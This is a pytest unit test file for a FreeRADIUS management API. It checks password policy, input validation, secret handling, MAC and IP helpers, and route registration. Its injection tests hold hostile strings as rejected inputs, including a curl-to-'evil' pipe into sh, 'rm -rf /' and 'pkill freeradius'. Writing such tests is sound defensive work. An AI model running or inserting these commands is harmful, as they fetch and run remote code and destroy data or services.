"""Guards for the critical GitHub-issue fixes (#2-#5) and core pure functions.

Runs without a database: DB access is stubbed where needed.
"""
import inspect
import os
import re
import sys

import pytest
from fastapi import HTTPException

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "api"))

import app


@pytest.fixture(autouse=True)
def no_db(monkeypatch):
    def _boom(*a, **k):
        raise RuntimeError("no DB in unit tests")

    monkeypatch.setattr(app, "get_db_connection", _boom)
    yield


# --- password policy / generation -------------------------------------------

def test_password_policy_rejects_weak():
    for bad in ["short1!", "abc123", "1234567", ""]:
        with pytest.raises(HTTPException):
            app.validate_password_policy(bad, "someuser")


def test_password_policy_accepts_strong():
    app.validate_password_policy("Str0ng!Passw0rd#42", "someuser")


def test_password_policy_accepts_simple_passwords():
    # Simple rule: min 8 chars, anything goes — mobile number alone passes.
    app.validate_password_policy("9876543210", "someuser")
    app.validate_password_policy("9876543210ram@", "someuser")
    app.validate_password_policy("9876543210Ram@", "someuser")
    app.validate_password_policy("alllowercasepassword", "someuser")


def test_password_policy_rejects_username_equal():
    with pytest.raises(HTTPException):
        app.validate_password_policy("Rajesh123!!", "rajesh123!!")


def test_generated_password_meets_policy_and_varies():
    pw1 = app.generate_secure_password(16)
    pw2 = app.generate_secure_password(16)
    assert len(pw1) == 16
    assert pw1 != pw2
    app.validate_password_policy(pw1, "x")
    info = app.password_strength(pw1)
    assert info["strength"] in ("fair", "good", "strong")


def test_redact_masks_nested_secrets():
    payload = {"user": "raj", "password": "s3cret", "nested": {"p12_bundle": "abc", "ok": 1}}
    out = app.redact(payload)
    assert out["password"] == "***REDACTED***"
    assert out["nested"]["p12_bundle"] == "***REDACTED***"
    assert out["nested"]["ok"] == 1
    assert out["user"] == "raj"


# --- input validators (issue #2: injection must 422) -------------------------

@pytest.mark.parametrize("bad", ['a"; id; echo "', "../../etc", "", "a/b", "x'; curl evil|sh; echo '"])
def test_username_rejects_injection(bad):
    with pytest.raises(HTTPException) as ei:
        app.validate_username(bad)
    assert ei.value.status_code == 422


def test_username_accepts_normal():
    assert app.validate_username("rajesh.kumar-01") == "rajesh.kumar-01"


@pytest.mark.parametrize("bad", ["1.2.3.4; id", "1.2.3.4; pkill freeradius", "not-an-ip", ""])
def test_nas_ip_rejects_injection(bad):
    with pytest.raises(HTTPException) as ei:
        app.validate_nas_ip(bad)
    assert ei.value.status_code == 422


@pytest.mark.parametrize("good", ["192.168.1.10", "10.10.0.12", "::1"])
def test_nas_ip_accepts_real_addresses(good):
    assert app.validate_nas_ip(good) == good


def test_acct_session_id_rejects_injection():
    with pytest.raises(HTTPException):
        app.validate_acct_session_id('a"; rm -rf /; echo "')
    assert app.validate_acct_session_id("ABCDEF123:789") == "ABCDEF123:789"


def test_no_shell_true_in_codebase():
    src = open(os.path.join(os.path.dirname(app.__file__), "app.py"), encoding="utf-8").read()
    assert "shell=True" not in src.replace("no shell=True anywhere", "")


def test_disconnect_uses_safe_helper():
    src = inspect.getsource(app.disconnect_session)
    assert "send_coa_disconnect" in src
    assert "shell" not in src


# --- p12 passwords (issue #3) -------------------------------------------------

def test_p12_passwords_are_random_and_unqualified():
    p1, p2 = app.generate_p12_password(), app.generate_p12_password()
    assert len(p1) >= 12 and p1 != p2
    assert "whatever" not in (p1 + p2).lower()


def test_no_well_known_p12_default_in_models():
    for model in (app.IssueCertRequest, app.PortalEnrollCertRequest, app.CertLoginRequest):
        for name, field in model.model_fields.items():
            if "password" in name:
                assert field.default != "whatever", f"{model.__name__}.{name}"


def test_no_static_secret_in_shipped_static_files():
    static = os.path.join(os.path.dirname(app.__file__), "static")
    for fname in os.listdir(static):
        if not fname.endswith((".html", ".js")):
            continue
        text = open(os.path.join(static, fname), encoding="utf-8").read()
        assert "RadSec_9921" not in text, fname
        assert "whatever" not in text.lower(), fname
        assert not re.search(r"secret:\s*['\"][^'\"]+['\"]", text), fname


# --- startup secrets (issue #5) ------------------------------------------------

def test_startup_refuses_published_defaults(monkeypatch):
    monkeypatch.setattr(app, "SESSION_SECRET", "change_this_session_secret_in_production_32_chars!")
    monkeypatch.setattr(app, "ADMIN_FALLBACK_PASS", "admin123")
    monkeypatch.setattr(app, "RADIUS_SECRET", "testing123")
    with pytest.raises(RuntimeError):
        app.check_startup_secrets()


def test_startup_accepts_strong_secrets(monkeypatch):
    monkeypatch.setattr(app, "SESSION_SECRET", "a" * 40)
    monkeypatch.setattr(app, "ADMIN_FALLBACK_PASS", "sTr0ng!uniq-Adm1n#pw")
    monkeypatch.setattr(app, "RADIUS_SECRET", "another-strong-secret-99")
    app.check_startup_secrets()  # must not raise


# --- session tokens ------------------------------------------------------------

def test_token_roundtrip_and_tamper_rejected(monkeypatch):
    monkeypatch.setattr(app, "SESSION_SECRET", "b" * 40)
    token = app.generate_session_token("raj")
    assert app.verify_session_token(token) == "raj"
    assert app.verify_session_token(token + "tampered") is None
    assert app.verify_session_token("garbage") is None


# --- glossary / explanations ----------------------------------------------------

def test_glossary_lookup_case_insensitive():
    assert "10.10.0.12" in app.glossary_lookup("Framed-IP-Address")
    assert app.glossary_lookup("FRAMED-IP-ADDRESS") == app.glossary_lookup("framed-ip-address")


def test_explain_attribute_value_aware():
    text = app.explain_attribute("Framed-IP-Address", "10.10.0.12")
    assert "Framed-IP-Address = 10.10.0.12" in text


# --- device inventory ------------------------------------------------------------

def test_mac_vendor_known_and_unknown():
    assert app.mac_vendor("8c:85:90:11:22:33") == "Apple"
    assert app.mac_vendor("50-CC-F8-AA-BB-CC") == "Samsung"
    assert app.mac_vendor("24a160001122") == "Espressif"
    assert app.mac_vendor("AA-BB-CC-DD-EE-FF") != ""
    assert "random" in app.mac_vendor("021122334455").lower()  # locally-administered
    assert app.mac_vendor("") == "—"
    assert app.mac_vendor(None) == "—"


def test_format_bytes_human():
    assert app.format_bytes(0) == "0 B"
    assert app.format_bytes(1500) == "1.5 KB"
    assert app.format_bytes(104857600) == "100.0 MB"


def test_devices_route_registered():
    paths = {getattr(r, "path", "") for r in app.app.routes}
    assert "/radius/api/devices" in paths


# --- tester verdict parsing (reject must never show green) -----------------------

REJECT_SAMPLE = """Sending Access-Request of id 12 to 127.0.0.1 port 1812
\tUser-Name = "raj"
Received Access-Reject Id 12 from 127.0.0.1:1812 length 20
(0) -: Expected Access-Accept got Access-Reject"""

ACCEPT_SAMPLE = """Sending Access-Request of id 13 to 127.0.0.1 port 1812
\tUser-Name = "raj"
Received Access-Accept Id 13 from 127.0.0.1:1812 length 26"""


def test_reject_with_expected_accept_line_is_failure():
    ok, verdict = app.parse_radtest_output(REJECT_SAMPLE)
    assert ok is False
    assert "eject" in verdict


def test_accept_is_success():
    ok, verdict = app.parse_radtest_output(ACCEPT_SAMPLE)
    assert ok is True
    assert "ccept" in verdict


def test_empty_output_is_failure():
    ok, _ = app.parse_radtest_output("")
    assert ok is False


# --- verified-device MAC helpers --------------------------------------------------

@pytest.mark.parametrize("raw,expected", [
    ("aa:bb:cc:dd:ee:ff", "AABBCCDDEEFF"),
    ("AA-BB-CC-DD-EE-FF", "AABBCCDDEEFF"),
    ("aabb.ccdd.eeff", "AABBCCDDEEFF"),
    ("AABBCCDDEEFF", "AABBCCDDEEFF"),
    ("aa bb cc dd ee ff", "AABBCCDDEEFF"),
])
def test_normalize_mac_formats(raw, expected):
    assert app.normalize_mac(raw) == expected


@pytest.mark.parametrize("bad", ["", "AA:BB:CC", "ZZ:ZZ:ZZ:ZZ:ZZ:ZZ", "AABBCCDDEEFF00", None])
def test_normalize_mac_rejects_garbage(bad):
    assert app.normalize_mac(bad) is None


def test_pretty_mac():
    assert app.pretty_mac("AABBCCDDEEFF") == "AA:BB:CC:DD:EE:FF"


def test_device_policy_routes_registered():
    paths = {getattr(r, "path", "") for r in app.app.routes}
    for needed in (
        "/radius/api/users/{username}/devices",
        "/radius/api/users/{username}/device-policy",
        "/radius/api/users/{username}/devices/{mac}",
    ):
        assert needed in paths, needed


def test_radius_enforcement_config():
    repo = os.path.join(os.path.dirname(app.__file__), "..")
    sites = open(os.path.join(repo, "config", "sites-available", "default"), encoding="utf-8").read()
    assert "verified_devices" in sites
    assert "user_device_policy" in sites
    assert "Reply-Message" in sites
    assert "reject" in sites
    sqlmod = open(os.path.join(repo, "config", "mods-available", "sql"), encoding="utf-8").read()
    assert "postauth_query" in sqlmod and "reason" in sqlmod
    schema = open(os.path.join(repo, "config", "schema.sql"), encoding="utf-8").read()
    assert "user_device_policy" in schema and "verified_devices" in schema
    assert "reason TEXT" in schema


# --- NAS-subnet coverage guard ------------------------------------------------------

LOCAL_NETS = (["192.168.1.0/24", "172.16.5.0/24"], False)


def test_cloud_ip_flagged_outside_local_nas_subnets(monkeypatch):
    """The Oracle-cloud 10.x pin against local 192/172 NASes must warn."""
    monkeypatch.setattr(app, "read_nas_networks", lambda: LOCAL_NETS)
    cov = app.check_ip_coverage("10.10.0.12")
    assert cov["valid"] is True and cov["covered"] is False
    warns = app.framed_ip_warnings({"Framed-IP-Address": "10.10.0.12"}, "User 'aman'")
    assert len(warns) == 1 and "10.10.0.12" in warns[0]


def test_local_ip_covered(monkeypatch):
    monkeypatch.setattr(app, "read_nas_networks", lambda: LOCAL_NETS)
    cov = app.check_ip_coverage("192.168.1.50")
    assert cov["valid"] is True and cov["covered"] is True


def test_catch_all_covers_everything(monkeypatch):
    monkeypatch.setattr(app, "read_nas_networks", lambda: (["0.0.0.0/0"], True))
    assert app.check_ip_coverage("10.10.0.12")["covered"] is True
    assert app.framed_ip_warnings({"Framed-IP-Address": "10.10.0.12"}, "User 'x'") == []


def test_no_nas_data_is_unknown_not_warning(monkeypatch):
    monkeypatch.setattr(app, "read_nas_networks", lambda: ([], False))
    cov = app.check_ip_coverage("10.10.0.12")
    assert cov["covered"] is None
    assert app.framed_ip_warnings({"Framed-IP-Address": "10.10.0.12"}, "User 'x'") == []


def test_invalid_ip_warns_and_other_attrs_ignored(monkeypatch):
    monkeypatch.setattr(app, "read_nas_networks", lambda: LOCAL_NETS)
    warns = app.framed_ip_warnings({"Framed-IP-Address": "not-an-ip"}, "User 'x'")
    assert len(warns) == 1 and "not a valid" in warns[0]
    assert app.framed_ip_warnings({"Session-Timeout": "7200"}, "User 'x'") == []
    assert app.framed_ip_warnings(None, "User 'x'") == []


def test_group_static_ip_gets_shared_clash_warning(monkeypatch):
    monkeypatch.setattr(app, "read_nas_networks", lambda: LOCAL_NETS)
    warns = app.framed_ip_warnings({"Framed-IP-Address": "192.168.1.50"}, "Group 'staff'")
    assert any("clash" in w or "shared" in w for w in warns)


def test_coverage_route_registered():
    paths = {getattr(r, "path", "") for r in app.app.routes}
    assert "/radius/api/networks/coverage" in paths


# --- route registration smoke test ----------------------------------------------

def test_critical_routes_registered():
    paths = set()
    for route in app.app.routes:
        p = getattr(route, "path", "")
        if p:
            paths.add(p)
    for needed in (
        "/radius/api/glossary",
        "/radius/api/sessions/disconnect",
        "/radius/api/portal/download-cert",
        "/radius/api/portal/download-mobileconfig",
        "/radius/api/certs/orphans",
        "/radius/api/accounting",
        "/radius/api/devices",
        "/radius/api/settings",
        "/radius/api/public-config",
    ):
        assert needed in paths, needed


def test_accounting_limit_is_clamped():
    src = inspect.getsource(app.get_accounting)
    assert "min(max(int(limit" in src and ", 500)" in src
    # clamp assignment must come before the value reaches SQL params
    assert src.index("min(max(int(limit") < src.index("params.append(limit)")


def test_settings_model_validation():
    req = app.SystemSettingsUpdateRequest(
        admin_contact_phone="+919876543210",
        admin_contact_name="Support Desk",
        upi_vpa="wifi@upi",
        upi_merchant_name="WiFi Provider",
        default_voucher_code="TRIAL100",
        currency="INR"
    )
    assert req.admin_contact_phone == "+919876543210"
    assert req.currency == "INR"


def test_client_ip_extraction_cloudflare_and_forwarded():
    from starlette.datastructures import Headers

    class DummyReq:
        def __init__(self, headers_dict, client_host="10.0.0.1"):
            self.headers = Headers(headers_dict)
            self.client = type("Client", (), {"host": client_host})()

    # Cloudflare header precedence
    req_cf = DummyReq({"cf-connecting-ip": "203.0.113.195", "x-forwarded-for": "198.51.100.1"})
    assert app._client_ip(req_cf) == "203.0.113.195"

    # X-Forwarded-For first IP
    req_xff = DummyReq({"x-forwarded-for": "198.51.100.22, 10.0.0.2"})
    assert app._client_ip(req_xff) == "198.51.100.22"

    # Fallback to direct client host
    req_direct = DummyReq({}, client_host="192.168.1.55")
    assert app._client_ip(req_direct) == "192.168.1.55"


def test_guest_user_generate_model_and_duration_map():
    req = app.GuestUserGenerateRequest()
    assert req.duration == "24h"
    assert req.group == "guests"
    assert req.prefix == "guest"

    assert "1h" in app.GUEST_DURATION_MAP and app.GUEST_DURATION_MAP["1h"][0] == 3600
    assert "24h" in app.GUEST_DURATION_MAP and app.GUEST_DURATION_MAP["24h"][0] == 86400
    assert "1d" in app.GUEST_DURATION_MAP and app.GUEST_DURATION_MAP["1d"][0] == 86400
    assert "7d" in app.GUEST_DURATION_MAP and app.GUEST_DURATION_MAP["7d"][0] == 604800
    assert "30d" in app.GUEST_DURATION_MAP and app.GUEST_DURATION_MAP["30d"][0] == 2592000


def test_guest_user_routes_registered():
    routes = {r.path for r in app.app.routes}
    assert "/radius/api/users/guest" in routes
    assert "/api/users/guest" in routes


def test_no_hardcoded_radius_secret_in_frontend():
    from pathlib import Path
    fe_dir = Path("frontend/src")
    forbidden = ["testing123", "RadSec_9921", "RADIUS_SECRET = '"]
    for p in fe_dir.rglob("*.jsx"):
        src = p.read_text(encoding="utf-8")
        for bad in forbidden:
            assert bad not in src, f"Found forbidden secret-like string '{bad}' in {p}"


def test_locale_immune_expiration_date_parser():
    import datetime as dt
    from api.entitlements import parse_freeradius_expiration
    
    parsed = parse_freeradius_expiration("15 Oct 2026 18:30:00")
    assert parsed is not None
    assert parsed.year == 2026
    assert parsed.month == 10
    assert parsed.day == 15
    assert parsed.hour == 18
    assert parsed.minute == 30
    assert parsed.second == 0
    assert parsed.tzinfo == dt.timezone.utc

    for m_idx, m_str in enumerate(["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"], 1):
        p = parse_freeradius_expiration(f"01 {m_str} 2027 00:00:00")
        assert p is not None
        assert p.month == m_idx

    assert parse_freeradius_expiration("garbage") is None
    assert parse_freeradius_expiration("") is None


def test_retention_tables_include_growth_tables():
    src = inspect.getsource(app.purge_expired_tables)
    assert "admin_audit_log" in src
    assert "audit_events" in src
    assert "radacct" in src
    assert "radpostauth" in src
    assert "revoked_certificates" in src


def test_health_endpoint_registered_and_structure():
    routes = {r.path for r in app.app.routes}
    assert "/health" in routes
    assert "/api/health" in routes
    assert "/radius/api/health" in routes
    assert "/radius/api/system/storage-health" in routes
    assert "/radius/api/system/storage-purge" in routes


def test_storage_health_stats_structure():
    stats = app.get_storage_health_stats()
    assert "retention_policy" in stats
    assert "radpostauth_days" in stats["retention_policy"]
    assert "radpostauth_max_rows" in stats["retention_policy"]
    assert stats["retention_policy"]["radpostauth_days"] <= 30
    assert stats["retention_policy"]["radpostauth_max_rows"] <= 50000





